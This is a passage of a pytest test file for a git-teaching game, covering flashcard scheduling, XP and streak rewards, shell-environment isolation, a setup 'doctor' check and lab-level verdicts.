def test_cards_due_for_review_come_from_any_chapter_and_cards_not_due_wait(sample_level: runner.Level) -> None:
    yesterday = (date.today() - timedelta(days=1)).isoformat()
    later = (date.today() + timedelta(days=3)).isoformat()
    save.write_progress({**save.new_progress(), "cards": {"hash-c01": {"box": 2, "due": yesterday}, "basics-c01": {"box": 1, "due": later}}})
    picked = game.due_cards(None, 50)
    assert [card["id"] for card in picked] == ["hash-c01"]
    assert [card["id"] for card in game.due_cards("basics", 3)][0] != "basics-c01"
    assert len(game.due_cards("basics", 50)) == 11


def test_a_due_card_comes_before_new_ones(sample_level: runner.Level) -> None:
    yesterday = (date.today() - timedelta(days=1)).isoformat()
    save.write_progress({**save.new_progress(), "cards": {"basics-c05": {"box": 2, "due": yesterday}}})
    assert game.due_cards("basics", 50)[0]["id"] == "basics-c05"


def test_a_card_view_hides_the_answer_among_shuffled_choices(sample_level: runner.Level) -> None:
    views = {card["id"]: card for card in game.due_cards("basics", 50)}
    choice, predict, text = views["basics-c01"], views["basics-predict"], views["basics-text"]
    assert [view["level_name"] for view in (choice, predict, text)] == ["basic", "deeper", "advanced"]
    assert (choice["kind"], sorted(option["value"] for option in choice["choices"]), choice["code"]) == ("choice", ["right", "worse", "wrong"], "")
    assert all(option["text"] == markup.parse(option["value"]) for option in choice["choices"])
    assert choice["prompt"] == markup.parse("Which one is `right`?")
    assert (predict["code"], sorted(option["value"] for option in predict["choices"])) == ("echo hi", ["ha", "hi", "ho"])
    assert all(option["text"] == [{"kind": "code", "text": option["value"]}] for option in predict["choices"])
    assert (text["choices"], text["placeholder"]) == ([], "a branch")
    assert "correct" not in choice and "accept" not in text


def test_choice_options_are_shown_as_parsed_text_and_answered_with_their_raw_value(sample_level: runner.Level, sample_decks: Path) -> None:
    (sample_decks / "branch.toml").write_text(
        """
[[card]]
id = "branch-ticks"
kind = "choice"
level = 1
prompt = "Which file does the commit hold?"
correct = "`note.txt` as it was when you ran `git add`"
wrong = ["`note.txt` as it is now", "No file at all"]
explain = "A commit takes the staging area."
source = "git-commit(1)"
"""
    )
    (view,) = game.due_cards("branch", 5)
    right = next(option for option in view["choices"] if option["value"] == "`note.txt` as it was when you ran `git add`")
    assert right["text"] == [
        {"kind": "para", "spans": [{"text": "note.txt", "code": True}, {"text": " as it was when you ran ", "code": False}, {"text": "git add", "code": True}]}
    ]
    result = game.answer_card("branch-ticks", right["value"])
    assert (result["correct"], result["answer"], result["answer_text"]) == (True, right["value"], right["text"])


def test_an_unknown_chapter_or_card_raises_unknown_id_error(sample_level: runner.Level) -> None:
    with pytest.raises(game.UnknownIdError, match="nowhere"):
        game.due_cards("nowhere", 5)
    with pytest.raises(game.UnknownIdError, match="basics-nothing"):
        game.answer_card("basics-nothing", "right")
    with pytest.raises(game.UnknownIdError, match="nowhere"):
        game.answer_card("nowhere-card", "right")
    with pytest.raises(game.UnknownIdError, match="nowhere"):
        game.notes("nowhere")


def test_a_right_answer_to_a_new_card_pays_and_schedules_it(sample_level: runner.Level) -> None:
    result = game.answer_card("basics-predict", "hi")
    assert result == {"correct": True, "answer": "hi", "answer_text": [{"kind": "code", "text": "hi"}], "explain": markup.parse("It echoes."), "xp": 20, "streak": 1, "bonus": 0}
    progress = save.load_progress()
    assert (progress["xp"], progress["streak"], progress["best_streak"]) == (20, 1, 1)
    assert progress["cards"]["basics-predict"] == {"box": 1, "due": (date.today() + timedelta(days=1)).isoformat()}


def test_a_wrong_answer_pays_nothing_and_brings_the_card_back_today(sample_level: runner.Level) -> None:
    game.answer_card("basics-c01", "right")
    result = game.answer_card("basics-text", "master")
    assert (result["correct"], result["answer"], result["answer_text"], result["xp"], result["streak"]) == (False, "main", markup.parse("main"), 0, 0)
    progress = save.load_progress()
    assert (progress["streak"], progress["best_streak"]) == (0, 1)
    assert progress["cards"]["basics-text"] == {"box": 0, "due": date.today().isoformat()}


def test_a_card_that_is_not_due_pays_nothing(sample_level: runner.Level) -> None:
    game.answer_card("basics-c01", "right")
    assert game.answer_card("basics-c01", "right")["xp"] == 0
    assert save.load_progress()["xp"] == 10


def test_the_fifth_paying_right_answer_in_a_row_earns_the_streak_bonus(sample_level: runner.Level) -> None:
    results = [game.answer_card(f"basics-c{number:02}", "right") for number in range(1, 6)]
    assert [result["bonus"] for result in results] == [0, 0, 0, 0, 25]
    assert save.load_progress()["xp"] == 5 * 10 + 25


def test_answers_given_at_the_same_time_are_all_counted(sample_level: runner.Level) -> None:
    threads = [threading.Thread(target=game.answer_card, args=(f"basics-c{number:02}", "right")) for number in range(1, 11)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    progress = save.load_progress()
    assert (progress["xp"], progress["streak"], len(progress["cards"])) == (10 * 10 + 2 * 25, 10, 10)


def test_a_chapters_notes_are_parsed_with_its_title(sample_level: runner.Level) -> None:
    assert game.notes("basics") == {"chapter": "basics", "title": CHAPTERS["basics"], "notes": markup.parse("The `three` areas.")}
    assert game.notes("toolbox")["notes"] == []


def test_the_terminal_opens_in_the_lab_project_else_the_lab_else_the_players_home(sample_level: runner.Level, game_home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("HOME", str(tmp_path))
    assert game.terminal_folder() == str(tmp_path)
    game.start(sample_level.id)
    assert game.terminal_folder() == str(lab_project(game_home))
    runner.lab_of(sample_level.id).project.rename(game_home / "labs" / "basics-sample" / "moved")
    assert game.terminal_folder() == str(game_home / "labs" / "basics-sample")


def test_asking_where_a_terminal_opens_changes_nothing(sample_level: runner.Level, game_home: Path) -> None:
    game.terminal_folder()
    assert list(game_home.iterdir()) == []


def test_a_shell_environment_keeps_git_to_the_game_and_everything_else_as_given(sample_level: runner.Level, game_home: Path) -> None:
    base = {"PATH": "/usr/bin", "EDITOR": "nano", "GIT_DIR": "/elsewhere/.git", "GIT_INDEX_FILE": "/elsewhere/index"}
    assert game.shell_environment(base) == {"PATH": "/usr/bin", "EDITOR": "nano", **gitcmd.isolation(game_home)}
    assert base["GIT_DIR"] == "/elsewhere/.git"


def test_a_shell_environment_comes_with_the_game_git_config_it_names(sample_level: runner.Level, game_home: Path) -> None:
    env = game.shell_environment({})
    assert Path(env["GIT_CONFIG_GLOBAL"]).read_text() == gitcmd.BASE_CONFIG
    Path(env["GIT_CONFIG_GLOBAL"]).write_text("[user]\n\tname = Ada\n")
    game.shell_environment({})
    assert Path(env["GIT_CONFIG_GLOBAL"]).read_text() == "[user]\n\tname = Ada\n"


def test_the_game_hands_the_interfaces_the_save_error_and_the_home() -> None:
    assert game.SaveError is save.SaveError
    assert game.home is save.home


def fake_git(folder: Path, version: str) -> str:
    """
    Put a ``git`` that only prints a version in a folder, and give a PATH that finds only it.

    Parameters
    ----------
    folder : Path
        Folder for the script.
    version : str
        What ``git --version`` prints.

    Returns
    -------
    str
        The PATH to use.
    """
    script = folder / "git"
    script.write_text(f"#!/bin/sh\necho '{version}'\n")
    script.chmod(script.stat().st_mode | stat.S_IXUSR)
    return str(folder)


def test_the_doctor_passes_on_a_machine_that_can_play() -> None:
    report = game.doctor()
    assert [item["check"] for item in report] == ["git", "python", "home"]
    assert all(item["ok"] for item in report), report


def test_the_doctor_refuses_a_git_older_than_2_32(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("PATH", fake_git(tmp_path, "git version 2.31.9"))
    git = game.doctor()[0]
    assert (git["ok"], "2.31" in git["detail"], "2.32" in git["detail"]) == (False, True, True)
    monkeypatch.setenv("PATH", fake_git(tmp_path, "git version 2.32.0"))
    assert game.doctor()[0]["ok"] is True


def test_the_doctor_reports_a_missing_git(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("PATH", str(tmp_path))
    git = game.doctor()[0]
    assert git["ok"] is False and "not found" in git["detail"]


def test_the_doctor_refuses_a_relative_or_unwritable_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("FIRSTCOMMIT_HOME", "relative/home")
    assert game.doctor()[2]["ok"] is False
    locked = tmp_path / "locked"
    locked.mkdir()
    locked.chmod(0o500)
    monkeypatch.setenv("FIRSTCOMMIT_HOME", str(locked / "home"))
    assert game.doctor()[2]["ok"] is (os.geteuid() == 0)


def test_every_record_is_json(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    for record in (game.status(), game.level(sample_level.id), game.lesson(sample_level.id), game.observe(), game.due_cards("basics", 3), game.check(None, auto=True)):
        json.dumps(record)


def test_a_game_home_inside_a_repository_never_shows_that_repository(sample_level: runner.Level, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    outer = tmp_path / "dotfiles"
    kit.git(tmp_path, "init", "-q", str(outer))
    monkeypatch.setenv("FIRSTCOMMIT_HOME", str(outer / "game-home"))
    without_repository = dataclasses.replace(sample_level, lesson=(kit.Slide(id="empty", title="Nothing yet", text="x", run="mkdir notes"),))
    monkeypatch.setattr(runner, "catalogue", lambda: {without_repository.id: without_repository})
    assert game.lesson(without_repository.id)["slides"][0]["map"]["exists"] is False
    game.start(without_repository.id)
    sandbox.remove_tree(runner.lab_of(without_repository.id).project / ".git", outer / "game-home")
    assert game.observe()["project"]["exists"] is False


def test_goals_met_that_do_not_match_the_step_are_a_damaged_save(sample_level: runner.Level) -> None:
    game.start(sample_level.id)
    for done in (["look", "stage"], ["fly"]):
        save.write_active({**active_record(), "step": 1, "done": done})
        with pytest.raises(game.SaveError, match="done"):
            game.quest_step(None)


def lost_for_good(lab: kit.Lab, state: kit.State, answer: str | None, typed: kit.Typed = ()) -> kit.Verdict:
    """
    Say the work is gone once ``hello.txt`` is deleted, as a level reads it from the facts setup saved.

    Parameters
    ----------
    lab : kit.Lab
        The lab.
    state : kit.State
        The level state.
    answer : str | None
        Ignored.
    typed : kit.Typed
        Ignored.

    Returns
    -------
    kit.Verdict
        Lost when the file is gone, else not solved.
    """
    gone = not (lab.project / "hello.txt").exists()
    return kit.Verdict(False, "Your hello is gone for good." if gone else "Keep going.", lost=gone)


def test_a_check_says_when_the_work_is_lost_for_good_so_the_page_offers_retry(sample_level: runner.Level, game_home: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    level = dataclasses.replace(sample_level, check=lost_for_good)
    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
    game.start(level.id)
    assert game.check(None, auto=False)["lost"] is False
    (lab_project(game_home) / "hello.txt").unlink()
    asked = game.check(None, auto=False)
    assert (asked["solved"], asked["lost"], asked["payout"], asked["message"]) == (False, True, None, markup.parse("Your hello is gone for good."))
    polled = game.check(None, auto=True)
    assert (polled["solved"], polled["lost"], polled["message"]) == (False, True, markup.parse("Your hello is gone for good."))


def test_before_the_quest_is_done_an_automatic_check_still_points_to_the_next_step_when_nothing_is_lost(sample_level: runner.Level, game_home: Path) -> None:
    game.start(sample_level.id)
    polled = game.check(None, auto=True)
    assert (polled["lost"], polled["message"]) == (False, markup.parse(game.QUEST_FIRST.format(step=1, steps=3)))
